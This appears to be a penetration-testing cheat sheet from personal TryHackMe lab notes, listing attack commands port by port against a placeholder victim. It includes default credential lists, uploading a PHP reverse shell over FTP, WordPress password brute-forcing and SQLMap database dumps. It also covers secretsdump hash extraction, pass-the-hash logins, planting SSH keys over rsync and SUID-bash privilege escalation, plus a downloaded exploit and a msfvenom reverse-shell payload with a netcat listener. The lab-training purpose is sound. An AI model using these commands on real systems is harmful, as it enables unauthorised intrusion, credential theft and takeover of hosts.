# Enumeration

## **Scans**

**Initial scan**

**Kali**

```
nmap -A $VICTIM
```

**Longer scan**

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

**Even longer scan**

**Kali**

```
nmap -sC -sV -p- $VICTIM
```

**Scan for vulnerabilities**

Change ports to the ports found from previous scans

**Kali**

```
nmap -p1,2,3,4 --script=vuln $VICTIM
```

## **Ports**

## TCP/21 - **FTP**

### **Common Credentials**

#### Usernames

```
anonymous
admin
guest
```

#### Passwords

```
anonymous
password
guest
```

### Access FTP

**Kali**

```
ftp $VICTIM 21
```

### List files

**Kali(ftp)**

```
ls
```

#### List files (using Curl)

**Kali**

```
curl ftp://anonymous:anonymous@$VICTIM:21
```



### Download  files

Change to Binary mode & passive (an important setting if you're uploading/downloading binary files like pictures and/or executables!).

**Kali(ftp)**

```
binary
passive
```

**Kali(ftp)**

```
get $fileName.txt
```

#### Download all files

**Kali(ftp)**

```
mget *
```

#### Download all files to the current directory (using Wget)

**Kali**

```
wget -m ftp://anonymous:anonymous@$VICTIM:21 -nd
```

### Upload files

If there is also a website being hosted and you can see the try adding a webshell and going to it from the browser.

**Kali(ftp)**

```
binary
passive
put php-reverse-shell.php
```



## **TCP/22 - SSH**

### SSH into host

**Kali**

```
ssh $USERNAME@$VICTIM

#SSH into non-standard port
ssh $USERNAME@$VICTIM -p2222
```

### Check this page for cracking examples

[#ssh](cheat-sheets/credential-gathering-and-cracking.md#ssh "mention")

## **TCP/25 - SMTP**

**Kali**

```
telnet $VICTIM 25
HELO
VRFY root
QUIT
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-commands 
```

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -
```

**Kali**

```
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $VICTIM
```



### Check for vulnerabilities&#x20;

**Kali**

```
sudo nmap $VICTIM -p25 --script smtp-vuln* 
```

### Check this page for cracking examples

[#smtp](cheat-sheets/credential-gathering-and-cracking.md#smtp "mention")



## **UDP/53 - DNS**

### Find subdomains

**Example**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")[#udp-53-dns](../walkthroughs/tryhackme/hip-flask.md#udp-53-dns "mention")

**Kali**

```
dig -t AXFR $HOST.thm @$DNSSERVER
```

##

##

## **TCP/80:443 - HTTP(s)**

Add things from this room: [https://tryhackme.com/room/contentdiscovery](https://tryhackme.com/room/contentdiscovery)

### Info gathering info

Check if any pages are listed

```
http://$VICTIM/robots.txt
http://$VICTIM/sitemap.xml
```

Check certificate for hostname. Then add to hosts file.

**Examples**

[spring.md](../walkthroughs/tryhackme/spring.md "mention")

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Create wordlist&#x20;

Creating a wordlist from this site based off of what is on the website.

**Examples**

[password-attacks.md](../walkthroughs/tryhackme/password-attacks.md "mention")

**Kali**

```
cewl -m 8 -w $LIST.lst https://$VICTIM 
```

### Find Directories

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

**Kali**

```
dirb http://$VICTIM/
dirb http://$VICTIM:$PORT/
dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt -z10 
```

### Find Pages

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

**Kali**

```
gobuster dir --url http://$VICTIM/ -w /usr/share/dirb/wordlists/big.txt -l
```

**Kali**

```
ffuf -u http://$VICTIM/static/FUZZ -w /usr/share/dirb/wordlists/big.txt
```

**Kali**

```
dirsearch -u $VICTIM:$PORT 
```

### Find pages with certain extensions

**Examples**

[#find-pages-with-certain-extensions](../walkthroughs/tryhackme/ffuf.md#find-pages-with-certain-extensions "mention")

**Kali**

```
head /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt  
```

**web-extensions.txt**

```
.asp
.aspx
.bat
.c
.cfm
.cgi
.css
.com
.dll
.exe
```

**Kali**

```
ffuf -u http://$VICTIM/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt  
```

### Find pages and exclude certain extensions

**Example**

[#find-pages-and-exclude-certain-extensions](../walkthroughs/tryhackme/ffuf.md#find-pages-and-exclude-certain-extensions "mention")

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-
```

### Using filters

**Example**

[#using-filters](../walkthroughs/tryhackme/ffuf.md#using-filters "mention")

By adding `-fc 403` (filter code) we'll hide from the output all 403 HTTP status codes.

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403
```



Use `-mc 200` (match code) instead of having a long list of filtered codes.

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -mc 200
```

We can use a regexp to match all files beginning with a dot.

**Kali**

```
ffuf -u http://$VICTIM/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fr '/\..*'
```

### Fuzzing parameters

**Example**

[#fuzzing-parameters](../walkthroughs/tryhackme/ffuf.md#fuzzing-parameters "mention")

ffuf allows you to put the keyword anywhere we can use it to fuzz for parameters.

**Kali**

```
ffuf -u http://$VICTIM/sqli-labs/Less-1/?FUZZ=1 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fw 39
```

### Find Vulnerabilities&#x20;

Nikto Tuning (-T) Options

```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)
```

#### Scan for misconfigurations

```
nikto -h $VICTIM -T 2 -Format txt 
```

#### Scan for SQL injection vulnerabilities.

```
nikto -h $VICTIM -T 9 -Format txt 
```

#### Authenticated nikito scan

**Examples**

[toolsrus.md](../walkthroughs/tryhackme/toolsrus.md "mention")

**Kali**

```
nikto -id $USERNAME:$PASSWORD -h http://$VICTIM:80/manager/html
```

#### Check for Shellshock

```
nmap -p 80 $VICTIM --script http-shellshock 
```

#### **Check for  Heartbleed**

```
nmap -p 443  $VICTIM --script ssl-heartbleed
```

### Fuzzing Subdomains

**Example**

[#fuzzing-domains](../walkthroughs/tryhackme/cmess.md#fuzzing-domains "mention")

**Kali**

```
wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://$URL.thm/' -H "Host: FUZZ.$URL.thm" > results.txt

grep -v '290 W' results.txt
```

**Example**

[#fuzz-subdomain](../walkthroughs/tryhackme/vulnnet.md#fuzz-subdomain "mention")

**Kali**

```
gobuster vhost -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://$URL.thm  
```

**Example**

[#finding-vhosts-and-subdomains](../walkthroughs/tryhackme/ffuf.md#finding-vhosts-and-subdomains "mention")

**Kali**

```
ffuf -u http://FUZZ.$URL.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### Proxifying ffuf traffic

Example

[#proxifying-ffuf-traffic](../walkthroughs/tryhackme/ffuf.md#proxifying-ffuf-traffic "mention")

**Kali**

```
ffuf -u http://$VICTIM -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080
```

It's also possible to send only matches to your proxy for replaying:

**Kali**

```
ffuf -u http://$VICTIM  -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -replay-proxy http://127.0.0.1:8080
```

### SQLMap

#### Get information

Can be used to get things like usernames and passwords or other information in the tables.

**Example**

[#sql](../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[expose.md](../walkthroughs/tryhackme/expose.md "mention")

**Kali**

```
sqlmap -u http://$VICTIM/$PAGE.php --forms --dump
OR
sqlmap -r request.txt --dbms=mysql --dump #Get request from Burp
```

#### **Get Databases**

**Examples**

[olympus.md](../walkthroughs/tryhackme/olympus.md "mention")[gallery.md](../walkthroughs/tryhackme/gallery.md "mention")

First capture the request of the page with Burp

**Kali**

```
sudo sqlmap -r request.req --dbs
```

Get tables

**Kali**

```
sudo sqlmap -r request.req --current-db $DATABASE --tables
```

Get fields for specified table&#x20;

**Kali**

```
sudo sqlmap -r request.req --current-db $DATABASE --tables -T $TABLE --columns
```

Get values of specific fields

**Kali**

```
sudo sqlmap -r request.req --current-db $DATABASE  --tables -T $TABLE  -C $FIELD1, $FIELD2 --dump
```

#### **Rescan SQLMap**

SQLMap will just give you the same results if you keep trying the same command, even if things have changed. Remove the cache to resolve this.

**Kali**

```
rm -rf /root/.sqlmap/output/$HOST.thm/
```



## Cookies

**Example**

[#cookies](../walkthroughs/tryhackme/avengers-blog.md#cookies "mention")

Get the flag with developer console by checking the cookie.

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

## HTTP Headers

**Example**

[#http-headers](../walkthroughs/tryhackme/avengers-blog.md#http-headers "mention")

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

### Run Web server

#### Kali

```
python2 -m SimpleHTTPServer 81
```

### Wordpress

#### Scan wordpress site

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")

#### Kali

```
HTTP
wpscan --url http://$VICTIM

HTTPS
wpscan --url http://$VICTIM --disable-tls-checks
```

#### Enumerate wordpress site

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")[wordpress-cve-2021-29447.md](../walkthroughs/tryhackme/wordpress-cve-2021-29447.md "mention")

#### Kali

```
wpscan --url http://$VICTIM -e p,t,u
```

#### Bruteforce admin page

#### Kali

```
wpscan --url http://$VICTIM --passwords /usr/share/wordlists/rockyou.txt
```

### .git folder found

**Examples**

[#gitdumper](../walkthroughs/tryhackme/spring.md#gitdumper "mention")

**Kali**

```
pip install git-dumper
mkdir git
git-dumper https://$VICTIM/sources/new/.git/ git/
cd git
git log

grep -r pass *
```



## Jenkins

#### Reverse Shell

**Examples**

[#jenkins-web](../walkthroughs/tryhackme/internal.md#jenkins-web "mention")



## UDP/88 - Kerberos

### Username Enumeration

Finds valid users

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")

```
kerbrute/dist/kerbrute_linux_386 userenum --dc=$VICTIM -d=$commonName $ListOfUsernames.txt
```

### Get Ticket

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")

The hash type is Kerberos 5 etype 23 AS-REP.

```
python3.9 /opt/impacket/examples/GetNPUsers.py -no-pass -usersfile validusers.txt -dc-ip $VICTIM $commonName
```



## **TCP/110 - POP3**

### Logging in with credentials

**Examples**

[#tcp-110-pop3](../walkthroughs/tryhackme/fowsniff-ctf.md#tcp-110-pop3 "mention")

```
telnet $VICTIM 110
USER root
PASS root
RETR 1 #change number for each available message
QUIT
```

### Check this page for cracking examples

[#pop3](cheat-sheets/credential-gathering-and-cracking.md#pop3 "mention")

## **TCP/135 - RPC**

**Kali**

```
rpcclient -U '' $VICTIM
srvinfo
netshareenum # print the real file-path of shares; good for accurate RCE
```

### **Login with credentials**

**Examples**

[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")

**Kali**

```
python3.9 /opt/impacket/build/scripts-3.9/psexec.py $USER@$VICTIM
Password: $PASSWORD
```

##

## **TCP/139 - NetBIOS**

**Examples**&#x20;

[#smb-port-139](../walkthroughs/tryhackme/basic-pentesting.md#smb-port-139 "mention")

### **Enumerate SMB**

**Kali**

```
nmap $VICTIM --script=smb-enum*
```



**Examples**&#x20;

[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")[vulnnet-internal.md](../walkthroughs/tryhackme/vulnnet-internal.md "mention")

**Kali**

```
nbtscan $VICTIM
```

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")

**Kali**

```
enum4linux $VICTIM
```

## **UDP/161 - SNMP**

## **Collect Information**

**Examples**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")

**Kali**

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
./snmpcheck-1.9.rb $VICTIM -c $COMMUNITYSTRING
```

## **TCP/389 - LDAP**

### Enumerating Active Directory

**Examples**

[enumerating-active-directory.md](../walkthroughs/tryhackme/enumerating-active-directory.md "mention")

### Breaching Active Directory

**Examples**

[breaching-active-directory.md](../walkthroughs/tryhackme/breaching-active-directory.md "mention")

### Exploiting Active Directory

**Examples**

[exploiting-active-directory.md](../walkthroughs/tryhackme/exploiting-active-directory.md "mention")

### Persisting Active Directory

**Examples**

[persisting-active-directory.md](../walkthroughs/tryhackme/persisting-active-directory.md "mention")

## **TCP/445  - SMB**

### Scanning

**Examples**

[basic-pentesting.md](../walkthroughs/tryhackme/basic-pentesting.md "mention")

**Kali**

```
nmap $VICTIM --script=smb-enum*
```

### **Common Credentials**

#### Usernames

```
anonymous
admin
guest

smbclient -L //$VICTIM/ -U $USERNAMES
```

### **List Shares**

**Option #1**

**Examples**

[gatekeeper.md](../walkthroughs/tryhackme/gatekeeper.md "mention")[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")[basic-pentesting.md](../walkthroughs/tryhackme/basic-pentesting.md "mention")

**Kali**

```
smbclient -L //$VICTIM/ 

# List shares on a non-standard SMB/Samba port
smbclient -L //$VICTIM/ -p $PORT 
```

**Option #2**&#x20;

**Examples**

[#dns-smb-and-snmp](../walkthroughs/tryhackme/enumeration.md#dns-smb-and-snmp "mention")

**Victim**

```
net share
```



### Download files&#x20;

#### Option #1

**Kali**

```
smbclient \\\\$VICTIM\\$SHARE
prompt
mget *
```

#### Option #2

**Kali**

```
smbmap -H $VICTIM
smbmap -H $VICTIM-P $PORT
```

#### Option #3

**Kali**

```
smbget -R smb://$VICTIM/$SHARE

# List shares on a non-standard SMB/Samba port
smbget -R smb://$VICTIM:$PORT/$SHARE
```

### Upload files

#### Option #1

**Kali**

```
smbclient \\\\$VICTIM\\$SHARE
put $FILE
```

### Detect Vulnerabilities

```
# Check if vulnerable to EternalBlue
sudo nmap $VICTIM -p445 --script smb-vuln-ms17-010 
```

```
# Check if vulnerable to SambaCry
sudo nmap $VICTIM -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version
```

## **TCP/667 - IRC**

```
irssi -c $VICTIM -p $PORT
```

## **TCP/873 - RSYNC**

### **Check Modules**

```
sudo nmap $VICTIM -p873 --script rsync-list-modules
```

### **List files**

**Example**

[#tcp-873-rsync](../walkthroughs/tryhackme/vulnnet-internal.md#tcp-873-rsync "mention")

```
rsync --list-only rsync://$VICTIM 
rsync --list-only rsync://$USERNAME@$VICTIM/$FOLDER
Password: $PASSWORD
```

### **Transfer files**

**Example**

[#tcp-873-rsync](../walkthroughs/tryhackme/vulnnet-internal.md#tcp-873-rsync "mention")

```
rsync authorized_keys rsync://$USERNAME@$VICTIM/$FOLDER/.ssh
Password: $PASSWORD
```

## **TCP/2049 - NFS**

<pre><code><strong>sudo nmap $VICTIM -p111 --script-nfs*
</strong></code></pre>



### Mount drive

**Examples**

[vulnnet-internal.md](../walkthroughs/tryhackme/vulnnet-internal.md "mention")

```
#This will list some folders hopefully
showmount -e $VICTIM
#Make a dir
mkdir /mnt/nfs
#/opt/conf is just an example, put what came out after showmount
mount $VICTIM:/opt/conf /mnt/nfs
cd /mnt/nfs
```

**Upload ID\_RSA key to login**

```
ssh-keygen -t rsa
cp ~/.ssh/id_rsa.pub authorized_keys
rsync authorized_keys rsync://rsync-connect@$VICTIM/files/sys-internal/.ssh
Password: pass

ssh $USERNAME@$VICTIM
```

**Create mount**

```
sudo mkdir /mnt/FOO
mount -t nfs $VICTIM:$SHARE /tmp/mount/ -nolock
sudo mount //$VICTIM:/$SHARE /mnt/FOO
```

**Interesting loot to look for**

<pre><code><strong>- id_rsa from users home directories
</strong></code></pre>

**Privilege Escalation**

Example of how you can get root shell. All commands except the last one are run on our Kali machine where we can control the permissions fully. Then we just run the exploit as the normal user we already have access to.

```
#Download exploit
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash

mv bash /mount/point
chown root /mount/point/bash
chmod +u /mount/point/bash
chmod +d /mount/point/bash

#SSH in as victim and run the following
/mount/point/bash -p
```

## **TCP/3306 - SQL**

**examples**

[#tcp-3306-mysql](../walkthroughs/tryhackme/umbrella.md#tcp-3306-mysql "mention")

```
mysql -u $USER -h $VICTIM -p'$PASSWORD'
```

**Kali(mysql)**

```
show databases;
use $DATABASE;
show tables;
select * from $TABLE;
```

## **TCP/3389 - RDP**

### **Scan**

**Kali**

```
sudo nmap $VICTIM -p3389 --script rdp-ntlm-info 
```

### **Login to host**

**Kali**

```
rdesktop -u $USERNAME $VICTIM
```

**Kali**

```
remmina
```

**Examples**

[retro.md](../walkthroughs/tryhackme/retro.md "mention")[blaster.md](../walkthroughs/tryhackme/blaster.md "mention")

**Kali**

```
xfreerdp /u:$USERNAME /p:$PASSWORD /cert:ignore /v:$VICTIM /workarea  +clipboard
```

**Kali**

```
xfreerdp +clipboard /u:"$USERNAME" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
Password: $PASSWORD 
```

## **TCP/5000 - Docker Registry**

### **Add repositories**

**Example**

[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")[umbrella.md](../walkthroughs/tryhackme/umbrella.md "mention")

**Kali**

```
subl /etc/docker/daemon.json
```

**daemon.json**

```
{
  "insecure-registries" : ["$VICTIM:5000"]
}
```

**Kali**

```
sudo systemctl stop docker
```

Wait 30 seconds

**Kali**

```
sudo systemctl start docker
```

### **List repositories**

**Example**

[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")[umbrella.md](../walkthroughs/tryhackme/umbrella.md "mention")

**Kali**

```
curl -s http://$VICTIM:5000/v2/_catalog
```

### **Get tags of a repository**

**Example**

[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")[umbrella.md](../walkthroughs/tryhackme/umbrella.md "mention")

**Kali**

```
curl -s http://$VICTIM:5000/v2/$REPOSITORY/tags/list
```

### **Get manifests**

**Example**

[the-docker-rodeo.md](../walkthroughs/tryhackme/the-docker-rodeo.md "mention")[#tcp-5000-docker-registry](../walkthroughs/tryhackme/umbrella.md#tcp-5000-docker-registry "mention")[umbrella.md](../walkthroughs/tryhackme/umbrella.md "mention")

Inside the manifest we can find potential credentials

**Kali**

```
curl -s http://$VICTIM:5000/v2/$REPOSITORY/manifests/latest
```

### Download the Docker image to find info

**Example**

[#download-the-docker-image-we-are-going-to-decompile-using](../walkthroughs/tryhackme/the-docker-rodeo.md#download-the-docker-image-we-are-going-to-decompile-using "mention")

**Kali**

```
docker pull $VICTIM:5000/$REPOSITORY
docker images
dive $IMAGE_ID
```

### Enter image

**Example**

[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")

**Kali**

```
docker -H $VICTIM:5000 images
docker -H $VICTIM:5000 run -v /:/mnt --rm -it $REPOSITORY chroot /mnt sh
```

## Uploading Malicious Docker Images

**Example**

[#vulnerability-3-uploading-malicious-docker-images](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-3-uploading-malicious-docker-images "mention")

**Kali**

```
docker pull
```

**Docker file example**

<figure><img src="../.gitbook/assets/image (1063).png" alt=""><figcaption></figcaption></figure>

## RCE via Exposed Docker Daemon

**Example**

[#vulnerability-4-rce-via-exposed-docker-daemon](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-4-rce-via-exposed-docker-daemon "mention")

## Escape via Exposed Docker Daemon

**Example**

[#vulnerability-5-escape-via-exposed-docker-daemon](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-5-escape-via-exposed-docker-daemon "mention")

## Shared Namespaces

**Example**

[#vulnerability-6-shared-namespaces](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-6-shared-namespaces "mention")

## Misconfigured Privileges

**Example**

[#vulnerability-7-misconfigured-privileges-deploy-2](../walkthroughs/tryhackme/the-docker-rodeo.md#vulnerability-7-misconfigured-privileges-deploy-2 "mention")

## Privilege Escalation with 2 shells and host mount

**Example**

[#privilege-escalation-with-2-shells-and-host-mount](../walkthroughs/tryhackme/umbrella.md#privilege-escalation-with-2-shells-and-host-mount "mention")

If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder. You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.

**Victim(root)**

```
find / -name "$FILE-BOTH-USERS-CAN-ACCESS"
cd /$FOLDER
cp /bin/bash . 
chown root:root bash
chmod 4777 bash
```

**Victim(claire-r)**

```
find / -name "$FILE-BOTH-USERS-CAN-ACCESS"
cd /$FOLDER-FROM-BEFORE-MIGHT-BE-DIFF-LOCATION
./bash -p 
```



## **TCP/5327 - Postgres**

```
psql -U postgres -p 5437 -h $VICTIM # postgres:postgres
SELECT pg_ls_dir('/');
```

## **TCP/5985** - WinRM or wsman

See TCP/5986 - WinRM for WinRM information

## **TCP/**5986 **- WinRM**

### **Dump Hashes**

Dump hashes of other users if the user you have access to has the privilege's to do so. If it does we can potentially use these hashes with evil-winrm to login as these other users.

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")

**Kali**

```
python3 /usr/local/bin/secretsdump.py  $DOMAIN/$USER:$PASSWORD@$VICTIM > allhashes.txt
cat allhashes.txt | awk -F : '{print $1 ":" $3}' | sort | uniq
```

### Login with found username and password

**Examples**

[#tampering-with-unprivileged-accounts](../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")

```
evil-winrm -u $USER -p $PASSWORD -i $VICTIM
```

### Login with found username and hash

**Examples**

[attacktive-directory.md](../walkthroughs/tryhackme/attacktive-directory.md "mention")[windows-local-persistence.md](../walkthroughs/tryhackme/windows-local-persistence.md "mention")

```
evil-winrm -i $VICTIM -u $VICTIMUSERNAME  -H $FOUNDHASH
```

## TCP/6379 - Redis

**Example**

[#tcp-6379-redis](../walkthroughs/tryhackme/vulnnet-internal.md#tcp-6379-redis "mention")

```
redis-cli -h $VICTIM -a "$PASSWORD"
$VICTIM:6379> KEYS *
$VICTIM:6379> KEYS "$VALUE"
$VICTIM:6379> GET "$VALUE"
$VICTIM:6379> LRANGE "$VALUE" 1 100
```

### **Get Users hash**

**Example**

[#tcp-139-netbios-1](../walkthroughs/tryhackme/vulnnet-active.md#tcp-139-netbios-1 "mention")

**Kali(redis-cli)**

```
config get *
```

**Kali**

```
responder -I ens5 -dvw  
```

(You can write anything in place of share, the share does not need to exist)

**Kali(redis-cli)**

```
eval "dofile('//$KALI/share')" 0
```

## TCP/7070 - AnyConnect

**Example**

[annie.md](../walkthroughs/tryhackme/annie.md "mention")

**Exploit:** [https://www.exploit-db.com/raw/49613](https://www.exploit-db.com/raw/49613)

For code above and just had to change the shellcode and ip variable.

**Kali**

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

**Kali**

```
nc -lvnp 4444
```

## TCP/11211 - Memcache&#x20;

### Dump cache

**Example**

[#tcp-11211-memcache](../walkthroughs/tryhackme/wekor.md#tcp-11211-memcache "mention")

**Victim**

```
cd /usr/share/memcached/scripts/  
./memcached-tool localhost:1121 dump
```



## TCP/27017 - MongoDB

**Example**

[#tcp-27017-mongo](../walkthroughs/tryhackme/road.md#tcp-27017-mongo "mention")

### Find Info in DB

**Victim**

```
mongo
```

**Victim(mongo)**

```
show dbs
use $DBSNAME
show collections
db.$FIELD.find();
exit
```

## Knock

**Example**

[the-great-escape.md](../walkthroughs/tryhackme/the-great-escape.md "mention")

Usually used in CTFs. Knock on certain ports in a certain pattern to open up more ports.

**Kali**

```
git clone https://github.com/grongor/knock.git
cd knock
./knock $VICTIM 42 1337 10420 6969 63000
```

\
